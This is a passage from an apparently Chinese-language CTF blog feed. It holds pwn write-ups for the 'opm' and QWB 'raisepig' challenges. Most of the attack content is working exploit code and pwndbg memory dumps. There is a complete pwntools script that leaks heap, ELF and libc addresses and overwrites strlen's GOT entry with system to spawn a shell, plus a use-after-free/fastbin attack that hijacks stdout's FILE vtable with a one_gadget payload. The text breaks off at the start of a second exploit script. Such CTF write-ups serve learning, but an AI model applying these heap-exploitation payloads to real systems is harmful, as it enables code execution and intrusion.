class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/8gx 0x000055877d5f0010</span><br><span class="line">0x55877d5f0010:0x00000000000000000x000055877d5ffd00-&gt;name</span><br><span class="line">0x55877d5f0020:0x00000000000000810x0000000000000003</span><br></pre></td></tr></table></figure></p><p>创建一个role2，第一次溢出覆盖v6最低位为<code>xxxxxx00</code>，本来应为<code>0x55877d5ffd90</code>，变成了<code>0x55877d5ffd00</code>，而这个地址是role1存放name的chunk。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0x55877d5ffd80:0x00000000000000100x0000000000000031</span><br><span class="line">0x55877d5ffd90:0x000055877c368b300x0000000000000000</span><br><span class="line">0x55877d5ffda0:0x00000000000000000x0000000000000000</span><br><span class="line">0x55877d5ffdb0:0x00000000000000000x0000000000000091</span><br><span class="line">0x55877d5ffdc0:0x43434343434343430x4343434343434343-&gt;name</span><br><span class="line">0x55877d5ffdd0:0x43434343434343430x4343434343434343</span><br></pre></td></tr></table></figure></p><p>重新查看role1的heap<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x55877d5ffd00:0x42424242424242420x000055877d5ffdc0-&gt;role1的name地址</span><br><span class="line">0x55877d5ffd10:0x00000000000000800x4242424242424242</span><br></pre></td></tr></table></figure></p><p>第二次溢出覆盖v6最低位为<code>xxxx0010</code>，那么v6变成<code>0x000055877d5f0010</code>，这个地址是role1的地址，函数结束时候show就会把role1-&gt;name打印出来，此时role-&gt;name有heap的地址。</p><p>有了heap地址，就可以伪造role泄露函数地址，<code>0x000055877d5ffdc0-0x30</code>就是role2-&gt;func的地址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add(&apos;E&apos;*8+p64(heap-0x30),str(131441).ljust(0x80,&apos;F&apos;)+p64(heap+0xc0))</span><br></pre></td></tr></table></figure><p>创建一个role3，利用role3-&gt;name进行伪造role，role3-&gt;name[0]当作func，role3-&gt;name[1]填入role2-&gt;func的地址<code>0x000055877d5ffdc0-0x30</code>，在第二个溢出点修改v6为fake role的地址<code>0x000055877d5ffdc0+0xc0</code>，由于punch num的输入会破坏top chunk，所以需要计算此时正确的数值，并输入。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">原来top chunk:0x201c1</span><br><span class="line">新建role3后申请了0x30+0x20的空间</span><br><span class="line">此时top chunk:0x201c1-0x50 = 0x20171 = 131441</span><br></pre></td></tr></table></figure></p><p>完成role3创建后heap结构：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/64gx 0x55877d5ffd80</span><br><span class="line">0x55877d5ffd80:0x00000000000000100x0000000000000031 ----&gt;role2</span><br><span class="line">0x55877d5ffd90:0x000055877c368b300x0000000000000000</span><br><span class="line">0x55877d5ffda0:0x00000000000000000x0000000000000000</span><br><span class="line">0x55877d5ffdb0:0x00000000000000000x0000000000000091</span><br><span class="line">0x55877d5ffdc0:0x43434343434343430x4343434343434343 ----&gt;role2-&gt;name</span><br><span class="line">0x55877d5ffdd0:0x43434343434343430x4343434343434343</span><br><span class="line">0x55877d5ffde0:0x43434343434343430x4343434343434343</span><br><span class="line">0x55877d5ffdf0:0x43434343434343430x4343434343434343</span><br><span class="line">0x55877d5ffe00:0x43434343434343430x4343434343434343</span><br><span class="line">0x55877d5ffe10:0x43434343434343430x4343434343434343</span><br><span class="line">0x55877d5ffe20:0x43434343434343430x4343434343434343</span><br><span class="line">0x55877d5ffe30:0x43434343434343430x4343434343434343</span><br><span class="line">0x55877d5ffe40:0x00000000000000000x0000000000000031 ----&gt;role3</span><br><span class="line">0x55877d5ffe50:0x000055877c368b300x000055877d5ffe80</span><br><span class="line">0x55877d5ffe60:0x000000000000000e0x0000000000000000</span><br><span class="line">0x55877d5ffe70:0x00000000000000000x0000000000000021</span><br><span class="line">0x55877d5ffe80:0x45454545454545450x000055877d5ffd90 ----&gt;role3-&gt;name # fake role</span><br><span class="line">0x55877d5ffe90:0x00000000000000000x0000000000020171 ----&gt;top chunk</span><br></pre></td></tr></table></figure></p><p>同理可以泄漏libc地址，然后利用第二个溢出点覆盖v6为strlen@got地址，通过写入punch num修改低8位地址为system地址或者onegadget地址。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">p = process(<span class="string">'./opm'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(name,n)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'(E)'</span>,<span class="string">'A'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'name:'</span>,name)</span><br><span class="line">    p.recvuntil(<span class="string">'punch?'</span>,timeout=<span class="number">0.5</span>)</span><br><span class="line">    p.sendline(str(n))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'(E)'</span>,<span class="string">'S'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">d</span><span class="params">()</span>:</span></span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    raw_input()</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./opm'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">add(<span class="string">'A'</span>*<span class="number">0x70</span>,<span class="number">1</span>)</span><br><span class="line">add(<span class="string">'B'</span>*<span class="number">0x80</span>+<span class="string">'\x10'</span>,<span class="number">2</span>)</span><br><span class="line">add(<span class="string">'C'</span>*<span class="number">0x80</span>,<span class="string">'3'</span>+<span class="string">'D'</span>*<span class="number">0x7f</span>+<span class="string">'\x10'</span>)</span><br><span class="line"><span class="comment"># leak heap addr</span></span><br><span class="line">p.recvuntil(<span class="string">'B'</span>*<span class="number">8</span>)</span><br><span class="line">heap = u64((p.recvuntil(<span class="string">'&gt;'</span>,drop=<span class="keyword">True</span>)).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">success(hex(heap))</span><br><span class="line"><span class="comment"># leak elf base</span></span><br><span class="line">add(<span class="string">'E'</span>*<span class="number">8</span>+p64(heap<span class="number">-0x30</span>),str(<span class="number">131441</span>).ljust(<span class="number">0x80</span>,<span class="string">'F'</span>)+p64(heap+<span class="number">0xc0</span>))</span><br><span class="line">p.recvuntil(<span class="string">'&lt;'</span>)</span><br><span class="line">func = u64((p.recvuntil(<span class="string">'&gt;'</span>,drop=<span class="keyword">True</span>)).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">elf.address = func<span class="number">-0xb30</span></span><br><span class="line">success(hex(elf.address)) </span><br><span class="line"><span class="comment"># leak libc base</span></span><br><span class="line">add(<span class="string">'G'</span>*<span class="number">8</span>+p64(elf.got[<span class="string">'strlen'</span>]),str(<span class="number">131441</span><span class="number">-0x30</span><span class="number">-0x20</span>).ljust(<span class="number">0x80</span>,<span class="string">'H'</span>)+p64(heap+<span class="number">0xc0</span>+<span class="number">0x30</span>+<span class="number">0x20</span>))</span><br><span class="line">p.recvuntil(<span class="string">'&lt;'</span>)</span><br><span class="line">strlen_addr = u64((p.recvuntil(<span class="string">'&gt;'</span>,drop=<span class="keyword">True</span>)).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">libc.address = strlen_addr - libc.symbols[<span class="string">'strlen'</span>]</span><br><span class="line">success(hex(libc.address))</span><br><span class="line"><span class="comment"># get shell</span></span><br><span class="line">add(<span class="string">'I'</span>*<span class="number">0x10</span>,str(libc.symbols[<span class="string">'system'</span>]&amp;<span class="number">0xffffffff</span>).ljust(<span class="number">0x80</span>,<span class="string">'J'</span>)+p64(elf.got[<span class="string">'strlen'</span>]<span class="number">-0x18</span>))</span><br><span class="line">add(<span class="string">'/bin/sh\x00'</span>,<span class="string">'5'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p><p>后来发现fake role向前移0x8就不会破坏top chunk，修改如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># leak elf addr</span></span><br><span class="line">add(p64(heap<span class="number">-0x30</span>),<span class="string">''</span>.ljust(<span class="number">0x80</span>,<span class="string">'F'</span>)+p64(heap+<span class="number">0xc0</span><span class="number">-0x8</span>))</span><br><span class="line"><span class="comment"># leak libc base</span></span><br><span class="line">add(p64(elf.got[<span class="string">'strlen'</span>]),<span class="string">''</span>.ljust(<span class="number">0x80</span>,<span class="string">'H'</span>)+p64(heap+<span class="number">0xc0</span>+<span class="number">0x30</span>+<span class="number">0x20</span><span class="number">-0x8</span>))</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;opm&quot;&gt;&lt;a href=&quot;#opm&quot; class=&quot;headerlink&quot; title=&quot;opm&quot;&gt;&lt;/a&gt;opm&lt;/h3&gt;&lt;p&gt;首先学习一下在IDA创建结构体，&lt;a href=&quot;https://blog.csdn.net/hgy413/article/deta
      
    
    </summary>
    
    
      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>qwb-pwn-raisepig</title>
    <link href="http://yoursite.com/2018/04/12/qwb-pwn-raisepig/"/>
    <id>http://yoursite.com/2018/04/12/qwb-pwn-raisepig/</id>
    <published>2018-04-12T08:32:54.000Z</published>
    <updated>2018-04-12T08:42:42.239Z</updated>
    
    <content type="html"><![CDATA[<h3 id="raisepig"><a href="#raisepig" class="headerlink" title="raisepig"></a>raisepig</h3><p>跟pwnable.tw的Secret Garden非常似。菜单有5个选项：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">puts(&quot;1 . Raise a pig &quot;);</span><br><span class="line">puts(&quot;2 . Visit pigs &quot;);</span><br><span class="line">puts(&quot;3 . Eat a pig&quot;);</span><br><span class="line">puts(&quot;4 . Eat the whole Pig Farm&quot;);</span><br><span class="line">puts(&quot;5 . Leave the Farm&quot;);</span><br></pre></td></tr></table></figure></p><p>IDA中建一个pig的结构体：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">00000000 pigs            struc ; (sizeof=0x28, mappedto_6)</span><br><span class="line">00000000 inuse           dq ?</span><br><span class="line">00000008 name            dq ?</span><br><span class="line">00000010 type            dq 3 dup(?)</span><br><span class="line">00000028 pigs            ends</span><br></pre></td></tr></table></figure><p>漏洞点在<code>Eat a pig</code>，inuse位清0，free掉name，在free前仅仅检查了pig_list是否存在，并且没有在free后对指针进行清空，存在UAF，可以double free。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">__<span class="function">int64 <span class="title">eat_one</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( pig_num )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Which pig do you want to eat:"</span>);</span><br><span class="line">    _isoc99_scanf(<span class="string">"%d"</span>, &amp;v1);</span><br><span class="line">    <span class="keyword">if</span> ( v1 &gt; <span class="number">0x63</span> || !pig_list[v1] )           <span class="comment">// 没有检查inuse</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Invalid choice"</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">    &#125;</span><br><span class="line">    srand(<span class="number">0</span>);</span><br><span class="line">    LODWORD(pig_list[v1]-&gt;inuse) = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">free</span>((<span class="keyword">void</span> *)pig_list[v1]-&gt;name);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"No pig"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><code>Eat the whole Pig Farm</code>会free掉所有还存在的pig，并且pig_list中指针清零。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">0x63</span>; ++i )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( pig_list[i] &amp;&amp; !LODWORD(pig_list[i]-&gt;inuse) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>(pig_list[i]);</span><br><span class="line">    pig_list[i] = <span class="number">0L</span>L;</span><br><span class="line">    --pig_num;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>首先要泄露出libc的地址，分配一个满足unsortedbin大小的chunk，然后free掉，然后再申请一个同样大小的堆，由于是用read读入的，输入结束没有<code>\x00</code>，name填满8字节，打印的时候就会把后面bk的内容打印出来。之后可以考虑使用fastbin attack改写<code>__malloc_hook</code>或者<code>__free_hook</code>为one gadget。</p><p><code>__malloc_hook</code>附近找到一个0x70大小的位置，然而本题环境使用malloc是没法达到one gadget执行需求。重复<code>free</code>同一个内存能触发<code>malloc_printerr</code>, 并调用<code>malloc</code>。然而触发<code>malloc_printerr</code>或直接调用<code>malloc</code>都getshell失败。</p><p>可行姿势为：利用fastbin attack攻击<code>Stdout</code>的file结构<code>_IO_2_1_stdout_</code>，更改<code>stdout</code>的<code>vtable</code>指向one_gadget。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p _IO_2_1_stdout_</span><br><span class="line">$1 = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = -72537977, </span><br><span class="line">    _IO_read_ptr = 0x7f23b5af66a3 &lt;_IO_2_1_stdout_+131&gt; &quot;\n&quot;, </span><br><span class="line">    _IO_read_end = 0x7f23b5af66a3 &lt;_IO_2_1_stdout_+131&gt; &quot;\n&quot;, </span><br><span class="line">    _IO_read_base = 0x7f23b5af66a3 &lt;_IO_2_1_stdout_+131&gt; &quot;\n&quot;, </span><br><span class="line">    _IO_write_base = 0x7f23b5af66a3 &lt;_IO_2_1_stdout_+131&gt; &quot;\n&quot;, </span><br><span class="line">    _IO_write_ptr = 0x7f23b5af66a3 &lt;_IO_2_1_stdout_+131&gt; &quot;\n&quot;, </span><br><span class="line">    _IO_write_end = 0x7f23b5af66a3 &lt;_IO_2_1_stdout_+131&gt; &quot;\n&quot;, </span><br><span class="line">    _IO_buf_base = 0x7f23b5af66a3 &lt;_IO_2_1_stdout_+131&gt; &quot;\n&quot;, </span><br><span class="line">    _IO_buf_end = 0x7f23b5af66a4 &lt;_IO_2_1_stdout_+132&gt; &quot;&quot;, </span><br><span class="line">    _IO_save_base = 0x0, </span><br><span class="line">    _IO_backup_base = 0x0, </span><br><span class="line">    _IO_save_end = 0x0, </span><br><span class="line">    _markers = 0x0, </span><br><span class="line">    _chain = 0x7f23b5af58e0 &lt;_IO_2_1_stdin_&gt;, </span><br><span class="line">    _fileno = 1, </span><br><span class="line">    _flags2 = 0, </span><br><span class="line">    _old_offset = -1, </span><br><span class="line">    _cur_column = 0, </span><br><span class="line">    _vtable_offset = 0 &apos;\000&apos;, </span><br><span class="line">    _shortbuf = &quot;\n&quot;, </span><br><span class="line">    _lock = 0x7f23b5af7780 &lt;_IO_stdfile_1_lock&gt;, </span><br><span class="line">    _offset = -1, </span><br><span class="line">    _codecvt = 0x0, </span><br><span class="line">    _wide_data = 0x7f23b5af57a0 &lt;_IO_wide_data_1&gt;, </span><br><span class="line">    _freeres_list = 0x0, </span><br><span class="line">    _freeres_buf = 0x0, </span><br><span class="line">    __pad5 = 0, </span><br><span class="line">    _mode = -1, </span><br><span class="line">    _unused2 = &apos;\000&apos; &lt;repeats 19 times&gt;</span><br><span class="line">  &#125;, </span><br><span class="line">  vtable = 0x7f23b5af46e0 &lt;_IO_file_jumps&gt;  &lt;-- 修改这里指向我们伪造的vtable</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><code>&lt;_IO_file_jumps&gt;</code>在<code>0x7f23b5af66f8</code>处<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> x/32a 0x7f23b5af6620</span></span><br><span class="line">0x7f23b5af6620 &lt;_IO_2_1_stdout_&gt;:0xfbad28870x7f23b5af66a3 &lt;_IO_2_1_stdout_+131&gt;</span><br><span class="line">0x7f23b5af6630 &lt;_IO_2_1_stdout_+16&gt;:0x7f23b5af66a3 &lt;_IO_2_1_stdout_+131&gt;0x7f23b5af66a3 &lt;_IO_2_1_stdout_+131&gt;</span><br><span class="line">0x7f23b5af6640 &lt;_IO_2_1_stdout_+32&gt;:0x7f23b5af66a3 &lt;_IO_2_1_stdout_+131&gt;0x7f23b5af66a3 &lt;_IO_2_1_stdout_+131&gt;</span><br><span class="line">0x7f23b5af6650 &lt;_IO_2_1_stdout_+48&gt;:0x7f23b5af66a3 &lt;_IO_2_1_stdout_+131&gt;0x7f23b5af66a3 &lt;_IO_2_1_stdout_+131&gt;</span><br><span class="line">0x7f23b5af6660 &lt;_IO_2_1_stdout_+64&gt;:0x7f23b5af66a4 &lt;_IO_2_1_stdout_+132&gt;0x0</span><br><span class="line">0x7f23b5af6670 &lt;_IO_2_1_stdout_+80&gt;:0x00x0</span><br><span class="line">0x7f23b5af6680 &lt;_IO_2_1_stdout_+96&gt;:0x00x7f23b5af58e0 &lt;_IO_2_1_stdin_&gt;</span><br><span class="line">0x7f23b5af6690 &lt;_IO_2_1_stdout_+112&gt;:0x10xffffffffffffffff</span><br><span class="line">0x7f23b5af66a0 &lt;_IO_2_1_stdout_+128&gt;:0xa0000000x7f23b5af7780 &lt;_IO_stdfile_1_lock&gt;</span><br><span class="line">0x7f23b5af66b0 &lt;_IO_2_1_stdout_+144&gt;:0xffffffffffffffff0x0</span><br><span class="line">0x7f23b5af66c0 &lt;_IO_2_1_stdout_+160&gt;:0x7f23b5af57a0 &lt;_IO_wide_data_1&gt;0x0</span><br><span class="line">0x7f23b5af66d0 &lt;_IO_2_1_stdout_+176&gt;:0x00x0</span><br><span class="line">0x7f23b5af66e0 &lt;_IO_2_1_stdout_+192&gt;:0xffffffff0x0</span><br><span class="line">0x7f23b5af66f0 &lt;_IO_2_1_stdout_+208&gt;:0x00x7f23b5af46e0 &lt;_IO_file_jumps&gt;</span><br><span class="line">0x7f23b5af6700 &lt;stderr&gt;:0x7f23b5af6540 &lt;_IO_2_1_stderr_&gt;0x7f23b5af6620 &lt;_IO_2_1_stdout_&gt;</span><br><span class="line">0x7f23b5af6710 &lt;stdin&gt;:0x7f23b5af58e0 &lt;_IO_2_1_stdin_&gt;0x7f23b5751b70 &lt;__gcc_personality_v0&gt;</span><br></pre></td></tr></table></figure></p><p>很好彩，在<code>_IO_2_1_stdout_+0x9d</code>处有可利用位置</p><p><code>IO_jump_t</code>中保存了一些函数指针，标准IO函数中会调用这些函数指针：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> * funcs[] = &#123;</span><br><span class="line">   <span class="number">1</span> <span class="literal">NULL</span>, <span class="comment">// "extra word"</span></span><br><span class="line">   <span class="number">2</span> <span class="literal">NULL</span>, <span class="comment">// DUMMY</span></span><br><span class="line">   <span class="number">3</span> <span class="built_in">exit</span>, <span class="comment">// finish</span></span><br><span class="line">   <span class="number">4</span> <span class="literal">NULL</span>, <span class="comment">// overflow</span></span><br><span class="line">   <span class="number">5</span> <span class="literal">NULL</span>, <span class="comment">// underflow</span></span><br><span class="line">   <span class="number">6</span> <span class="literal">NULL</span>, <span class="comment">// uflow</span></span><br><span class="line">   <span class="number">7</span> <span class="literal">NULL</span>, <span class="comment">// pbackfail</span></span><br><span class="line">   <span class="number">8</span> <span class="literal">NULL</span>, <span class="comment">// xsputn  #printf</span></span><br><span class="line">   <span class="number">9</span> <span class="literal">NULL</span>, <span class="comment">// xsgetn</span></span><br><span class="line">   <span class="number">10</span> <span class="literal">NULL</span>, <span class="comment">// seekoff</span></span><br><span class="line">   <span class="number">11</span> <span class="literal">NULL</span>, <span class="comment">// seekpos</span></span><br><span class="line">   <span class="number">12</span> <span class="literal">NULL</span>, <span class="comment">// setbuf</span></span><br><span class="line">   <span class="number">13</span> <span class="literal">NULL</span>, <span class="comment">// sync</span></span><br><span class="line">   <span class="number">14</span> <span class="literal">NULL</span>, <span class="comment">// doallocate</span></span><br><span class="line">   <span class="number">15</span> <span class="literal">NULL</span>, <span class="comment">// read</span></span><br><span class="line">   <span class="number">16</span> <span class="literal">NULL</span>, <span class="comment">// write</span></span><br><span class="line">   <span class="number">17</span> <span class="literal">NULL</span>, <span class="comment">// seek</span></span><br><span class="line">   <span class="number">18</span> pwn,  <span class="comment">// close</span></span><br><span class="line">   <span class="number">19</span> <span class="literal">NULL</span>, <span class="comment">// stat</span></span><br><span class="line">   <span class="number">20</span> <span class="literal">NULL</span>, <span class="comment">// showmanyc</span></span><br><span class="line">   <span class="number">21</span> <span class="literal">NULL</span>, <span class="comment">// imbue</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p><code>printf</code>是通过<code>_IO_file_xsputn</code>实现的，<code>fake_vtable[7]</code>放入one_gadget，调用<code>printf</code>的时候就可以getshell。下面开始构造payload：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> x/32gx 0x7f23b5af6620+0x9d+3</span></span><br><span class="line">0x7f23b5af66c0 &lt;_IO_2_1_stdout_+160&gt;:0x00007f23b5af57a00x0000000000000000</span><br><span class="line">0x7f23b5af66d0 &lt;_IO_2_1_stdout_+176&gt;:0x00000000000000000x0000000000000000</span><br><span class="line">0x7f23b5af66e0 &lt;_IO_2_1_stdout_+192&gt;:0x00000000ffffffff0x0000000000000000</span><br><span class="line">0x7f23b5af66f0 &lt;_IO_2_1_stdout_+208&gt;:0x00000000000000000x00007f23b5af46e0 --&gt; vtable</span><br></pre></td></tr></table></figure></p><p>构造如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = &apos;a&apos;*3 + p64(0)*2 + p64(0xffffffff) + p64(0)*2 + p64(fake_vtable)</span><br></pre></td></tr></table></figure></p><p>由于没有泄露heap地址，直接利用本次写入one gadget到<code>&lt;_IO_2_1_stdout_+208&gt;</code>，那么<code>fake_vtable</code>地址为<code>&lt;_IO_2_1_stdout_+208-7*8&gt;</code></p><p>EXP:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">p = process(<span 